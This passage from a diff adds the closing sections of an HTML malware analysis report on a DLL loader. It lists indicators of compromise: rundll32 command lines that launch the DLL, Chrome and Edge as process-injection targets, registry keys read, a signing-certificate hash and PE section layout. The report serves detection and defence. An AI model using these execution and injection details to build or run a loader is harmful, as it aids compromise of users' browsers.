+                <tr><td>File</td><td><code>C:\Users\user\AppData\Local\Temp\e892839eb1df091ef5279e8a2af9a002.dll</code></td><td>Temporary DLL path</td></tr>
+                <tr><td>Process</td><td><code>rundll32.exe "attachment.dll",#1</code></td><td>Ordinal-based DLL execution</td></tr>
+                <tr><td>Process</td><td><code>rundll32.exe "init.dll",CPlApplet</code></td><td>Control Panel export execution</td></tr>
+                <tr><td>Injection target</td><td><code>C:\Program Files\Google\Chrome\Application\chrome.exe</code></td><td>Target process</td></tr>
+                <tr><td>Injection target</td><td><code>C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe</code></td><td>Target process</td></tr>
+                <tr><td>Registry read</td><td><code>HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\chrome.exe</code></td><td>Browser/environment lookup</td></tr>
+                <tr><td>Registry read</td><td><code>HKCU\Software\Microsoft\Windows\Shell\Associations\UrlAssociations\http\UserChoice</code></td><td>Default-browser association lookup</td></tr>
+              </tbody>
+            </table>
+          </div>
+
+          <h3>Authenticode artefacts</h3>
+          <div class="table-wrap">
+            <table>
+              <thead><tr><th>Type</th><th>Value</th><th>Context</th></tr></thead>
+              <tbody>
+                <tr><td>Certificate SHA-256</td><td><code>9CA7E147D9EEAC590ABE60725088733A34019609B34A70DD0F423317C53D9A88</code></td><td>RHM LIMITED signing certificate</td></tr>
+                <tr><td>Serial number</td><td><code>F0 FB 13 90 F5 34 0C D2 57 24 51 D9 5D B1 D9 2D</code></td><td>PKCS#7 certificate data</td></tr>
+              </tbody>
+            </table>
+          </div>
+        </section>
+
+        <section class="section" id="artifacts">
+          <div class="section-kicker">09 · PE structure</div>
+          <h2>Additional High-Value Artefacts</h2>
+          <h3>Exported entry point</h3>
+          <p><code>Export #1/CPlApplet</code> · RVA <code>0x00001010</code> · file offset <code>0x00000410</code>.</p>
+          <h3>Virtual section layout</h3>
+          <div class="table-wrap">
+            <table>
+              <thead><tr><th>Section</th><th>RVA range</th><th>Purpose</th></tr></thead>
+              <tbody>
+                <tr><td><code>.text</code></td><td><code>0x00001000–0x00008000</code></td><td>Executable code</td></tr>
+                <tr><td><code>.rdata</code></td><td><code>0x00008000–0x0000C000</code></td><td>Read-only data and configuration material</td></tr>
+                <tr><td><code>.data</code></td><td><code>0x0000C000–0x0000E000</code></td><td>Globals and configuration buffers</td></tr>
+                <tr><td><code>.pdata</code></td><td><code>0x0000E000–0x0000F000</code></td><td>Exception directory</td></tr>
+                <tr><td><code>.idata</code></td><td><code>0x0000F000–0x00012000</code></td><td>Imports and IPv6 payload arrays</td></tr>
+                <tr><td><code>.rsrc</code></td><td><code>0x00012000–0x0001A000</code></td><td>Resources and masquerade metadata</td></tr>
+              </tbody>
+            </table>
+          </div>
+        </section>
+
+      </article>
+    </div>
+  </main>
+
+  <footer class="footer">
+    <div class="wrap footer-inner">
+      <span>Horus Loader DLL · Reverse-Engineering Report</span>
+      <span>Technical analysis · 02 November 2026</span>
+    </div>
+  </footer>
+
+  <button class="back" type="button" aria-label="Back to top" onclick="location.href='#top'">↑</button>
+
+  <script>
+    const hash = document.getElementById('sample-hash').textContent.trim();
+    function flash(button, text) {
+      const old = button.textContent;
+      button.textContent = text;
+      setTimeout(() => button.textContent = old, 1200);
+    }
+    async function copyHash(button) {
+      try { await navigator.clipboard.writeText(hash); flash(button, 'Copied'); }
+      catch (_) { flash(button, 'Copy failed'); }
+    }
+    async function copyCode(button) {
+      const text = button.closest('.code-panel').querySelector('code').innerText;
+      try { await navigator.clipboard.writeText(text); flash(button, 'Copied'); }
+      catch (_) { flash(button, 'Copy failed'); }
+    }
+    const back = document.querySelector('.back');
+    addEventListener('scroll', () => back.classList.toggle('show', scrollY > 650), { passive: true });
+    const links = [...document.querySelectorAll('.toc a')];
+    const sections = [...document.querySelectorAll('article .section')];
+    const observer = new IntersectionObserver(entries => {
+      entries.forEach(entry => {
+        if (entry.isIntersecting) {
+          links.forEach(link => link.classList.toggle('active', link.hash === '#' + entry.target.id));
+        }
+      });
+    }, { rootMargin: '-20% 0px -70% 0px' });
+    sections.forEach(section => observer.observe(section));
+  </script>
+</body>
+</html>
